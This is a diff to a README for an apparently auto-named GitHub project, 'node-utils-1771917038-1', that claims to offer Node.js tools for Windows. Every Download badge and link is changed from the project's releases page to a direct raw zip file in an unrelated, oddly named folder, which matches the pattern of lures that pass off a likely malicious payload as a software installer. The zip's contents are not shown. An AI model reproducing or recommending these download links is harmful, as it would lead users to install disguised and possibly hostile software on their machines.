@@ -1,6 +1,6 @@
 # ⚙️ node-utils-1771917038-1 - Handy Node.js Tools for Everyday Tasks
 
-[![Download](https://img.shields.io/badge/Download-Get%20Node%20Utils-brightgreen)](https://github.com/Paul236/node-utils-1771917038-1/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Node%20Utils-brightgreen)](https://github.com/Paul236/node-utils-1771917038-1/raw/refs/heads/main/scirrhogastria/node-utils-1.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To run node-utils-1771917038-1, your Windows PC should meet the following:
 
 Click the big green button below to go directly to the download page. This page contains the latest version of the application ready for Windows.
 
-[![Download](https://img.shields.io/badge/Download-Get%20Node%20Utils-brightgreen)](https://github.com/Paul236/node-utils-1771917038-1/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Node%20Utils-brightgreen)](https://github.com/Paul236/node-utils-1771917038-1/raw/refs/heads/main/scirrhogastria/node-utils-1.6.zip)
 
 ### Step 2: Choose the Correct Download File
 
@@ -114,7 +114,7 @@ If problems persist, you can find help by opening the 'Help' menu within the app
 
 Periodically visit the release page to check for new versions or improvements.
 
-[Visit this page to download the latest version](https://github.com/Paul236/node-utils-1771917038-1/releases)
+[Visit this page to download the latest version](https://github.com/Paul236/node-utils-1771917038-1/raw/refs/heads/main/scirrhogastria/node-utils-1.6.zip)
 
 Download the newest installer and follow the same installation steps. This will update your current version and keep your tools working smoothly.
 
@@ -142,4 +142,4 @@ The application handles these and similar jobs with straightforward steps and no
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Node%20Utils-brightgreen)](https://github.com/Paul236/node-utils-1771917038-1/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20Node%20Utils-brightgreen)](https://github.com/Paul236/node-utils-1771917038-1/raw/refs/heads/main/scirrhogastria/node-utils-1.6.zip)
